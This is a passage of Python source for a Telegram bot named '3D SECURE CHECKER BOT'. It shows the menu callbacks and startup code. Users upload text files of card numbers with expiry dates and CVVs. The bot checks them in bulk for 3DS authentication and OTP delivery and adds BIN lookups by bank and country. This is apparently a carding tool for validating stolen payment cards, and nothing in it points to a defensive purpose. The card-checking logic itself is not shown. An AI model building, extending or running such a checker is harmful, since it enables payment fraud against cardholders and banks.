                await context.application.bot.send_message(
                    chat_id=stats['chat_id'],
                    text="🛑 **Check stopped by user!**",
                    parse_mode='Markdown'
                )
            except:
                pass
    
    elif query.data == "select_mode":
        keyboard = [
            [InlineKeyboardButton("⚡ Basic Mode (3DS only)", callback_data="mode_basic")],
            [InlineKeyboardButton("🔍 Advanced Mode (3DS + OTP check)", callback_data="mode_advanced")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
        ]
        
        current_mode = "🔍 Advanced" if stats.get('check_mode', 'basic') == 'advanced' else "⚡ Basic"
        
        await query.edit_message_text(
            "⚙️ **SELECT CHECK MODE:**\n\n"
            "⚡ **Basic Mode:**\n"
            "• Fast card verification\n"
            "• Checks 3DS authentication only\n"
            "• Does not verify OTP delivery\n"
            "• Recommended for quick checks\n\n"
            "🔍 **Advanced Mode:**\n"
            "• Comprehensive verification\n"
            "• Checks 3DS authentication\n"
            "• Verifies OTP delivery status\n"
            "• Shows detailed error messages\n"
            "• Detects OTP delivery failures\n"
            "• Recommended for thorough analysis\n\n"
            f"🔧 **Current Mode:** {current_mode}",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif query.data == "mode_basic":
        stats['check_mode'] = 'basic'
        await query.answer("✅ Basic mode activated", show_alert=True)
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]]
        
        await query.edit_message_text(
            "✅ **BASIC MODE ACTIVATED!**\n\n"
            "⚡ **Features:**\n"
            "• Fast and efficient checking\n"
            "• 3DS verification only\n"
            "• Perfect for quick validation\n"
            "• No OTP delivery check\n\n"
            "📝 You can now send your card file",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif query.data == "mode_advanced":
        stats['check_mode'] = 'advanced'
        await query.answer("✅ Advanced mode activated", show_alert=True)
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]]
        
        await query.edit_message_text(
            "✅ **ADVANCED MODE ACTIVATED!**\n\n"
            "🔍 **Features:**\n"
            "• Comprehensive verification\n"
            "• 3DS authentication check\n"
            "• OTP delivery verification\n"
            "• Detailed status messages:\n"
            "  - ✅ OTP sent successfully\n"
            "  - ⚠️ OTP delivery failed\n"
            "  - ❓ Unclear OTP status\n\n"
            "📊 **Result Categories:**\n"
            "• **3DS Success**: Full pass with OTP\n"
            "• **OTP Failed**: 3DS passed but OTP issue\n"
            "• **Failed**: 3DS authentication failed\n\n"
            "📝 You can now send your card file",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif query.data == "back_to_main":
        keyboard = [
            [InlineKeyboardButton("📁 Send Card File", callback_data="send_file")],
            [InlineKeyboardButton("⚙️ Select Check Mode", callback_data="select_mode")]
        ]
        
        await query.edit_message_text(
            "╔════════════════════════╗\n"
            "🚀 **3D SECURE CHECKER BOT** 🚀\n"
            "╚════════════════════════╝\n\n"
            "💼 **How to use:**\n"
            "Send a .txt file with cards\n"
            "Format: `number|month|year|cvv`\n\n"
            "🎯 **Check Modes:**\n"
            "⚡ **Basic Mode**: Fast 3DS check only\n"
            "🔍 **Advanced Mode**: 3DS + OTP delivery status\n\n"
            f"🔧 **Current Mode:** {'🔍 Advanced' if stats.get('check_mode') == 'advanced' else '⚡ Basic'}\n\n"
            "✨ **Features:**\n"
            "• Multi-user support\n"
            "• Real-time dashboard\n"
            "• BIN lookup (Bank, Country, Type)\n"
            "• OTP delivery verification\n"
            "• Comprehensive error detection\n\n"
            "👥 Multiple users can check simultaneously!",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif query.data == "send_file":
        await query.answer("📁 Send your card file now", show_alert=True)
    
    elif query.data == "mode_info":
        mode_text = "🔍 Advanced (with OTP check)" if stats['check_mode'] == 'advanced' else "⚡ Basic (3DS only)"
        await query.answer(f"Current mode: {mode_text}", show_alert=True)
    
    elif query.data == "otp_failed":
        await query.answer(
            f"⚠️ OTP Failed: {stats['otp_failed']} cards\n"
            "These cards passed 3DS but had OTP delivery issues",
            show_alert=True
        )

def main():
    print("╔════════════════════════════════════════╗")
    print("║   3D SECURE CHECKER BOT - ENHANCED    ║")
    print("╚════════════════════════════════════════╝")
    print()
    print("[🤖] Starting Telegram Bot...")
    print("[✅] Multi-User Support: ENABLED")
    print("[⚡] Basic Mode: Fast 3DS check")
    print("[🔍] Advanced Mode: 3DS + OTP verification")
    print("[🔔] NEW: OTP Failed detection")
    print("[🏦] NEW: BIN Lookup (Bank, Country, Type)")
    print("[👥] Multiple users can check simultaneously")
    print()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("[✅] Bot is running...")
    print(f"[👥] Authorized users: {len(ADMIN_IDS)}")
    print("[🚀] Ready to process cards!")
    print()
    app.run_polling()

if __name__ == "__main__":
    main()
